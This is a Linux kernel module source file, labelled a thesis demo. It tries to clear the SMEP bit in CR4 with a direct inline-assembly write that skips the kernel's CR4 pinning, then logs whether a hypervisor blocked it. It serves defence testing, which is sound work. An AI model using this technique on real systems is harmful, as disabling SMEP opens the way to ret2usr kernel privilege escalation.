// SPDX-License-Identifier: GPL-2.0
/*
 * attack.c — Demo attack: attempt to clear CR4.SMEP
 *
 * Without hypervisor: SMEP gets cleared (ret2usr attack now possible).
 * With hypervisor:    write is intercepted, SMEP stays on, block logged.
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <asm/processor.h>

static int __init attack_init(void)
{
	unsigned long cr4_before, cr4_after;
	unsigned long cr4_target;

	cr4_before = native_read_cr4();
	pr_info("[attack] CR4 before write: 0x%lx  (SMEP=%d)\n",
		cr4_before, !!(cr4_before & X86_CR4_SMEP));

	/* Build target value with SMEP bit cleared */
	cr4_target = cr4_before & ~X86_CR4_SMEP;
	pr_info("[attack] Attempting to write CR4 = 0x%lx (SMEP cleared)...\n",
		cr4_target);

	/* Direct CR4 write bypasses native_write_cr4() kernel pinning */
	asm volatile("mov %0, %%cr4" : : "r"(cr4_target) : "memory");

	cr4_after = native_read_cr4();
	pr_info("[attack] CR4 after  write: 0x%lx  (SMEP=%d)\n",
		cr4_after, !!(cr4_after & X86_CR4_SMEP));

	if (cr4_after & X86_CR4_SMEP)
		pr_warn("[attack] RESULT: SMEP still ON — hypervisor blocked the attack!\n");
	else
		pr_warn("[attack] RESULT: SMEP is OFF  — attack succeeded (no hypervisor)!\n");

	return 0;
}

static void __exit attack_exit(void)
{
	pr_info("[attack] module unloaded\n");
}

module_init(attack_init);
module_exit(attack_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("SMEP disable attack — thesis demo");
